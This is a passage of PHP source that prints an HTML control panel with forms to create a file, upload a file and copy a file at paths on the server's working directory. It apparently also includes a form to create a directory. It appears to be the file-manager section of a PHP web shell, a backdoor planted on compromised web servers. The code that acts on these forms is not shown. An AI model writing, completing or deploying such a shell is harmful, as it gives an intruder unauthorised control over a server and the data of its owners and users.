<td width="750" style="border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom:"><input name=cdirname value='.getcwd().$slash.' size=50><input type=hidden name=address value='.getcwd().'><input type=submit value="  Create  "></form></td></tr>
<tr>
<td width="200" align="right" valign="top" style="border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom:">
<font face="" style="font-size: 10pt; font-weight:700"><br>'.$formg.'Create File : </font></td>
<td width="750" style="border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom:"><input name=cfilename value='.getcwd().$slash.' size=50> <input type=hidden name=address value='.getcwd().'><input type=submit value="  Create  "></form></td></tr>
<tr></form>
<tr>
<form action="'.$me.'" method="post" enctype=multipart/form-data>
<td width="200" align="right" valign="top" style="border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom:">
<font face="" style="font-size: 10pt; font-weight:700"><br>'.$formg.'Upload : </font></td>
<td width="750" style="border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom:">
'.$nowaddress.'
<font face="" style="font-size: 10pt"><input size=40 type=file name=filee > <input type=hidden name=address value='.getcwd().'>
<input type=submit value=Upload /></form></td></tr>
<tr>
<td width="200" align="right" valign="top" style="border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom:">
<font face="" style="font-size: 10pt; font-weight:700"><br>'.$formg.'Copy File : </font></td>
<td width="750" style="border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom:"><input size=20 name=copyname><input type=hidden name=address value="'.getcwd().'"> To <input size=40 name=cpyto value="'.getcwd().$slash.'"> <input type=submit value =Copy></form></td></tr>
'.$end;
?>
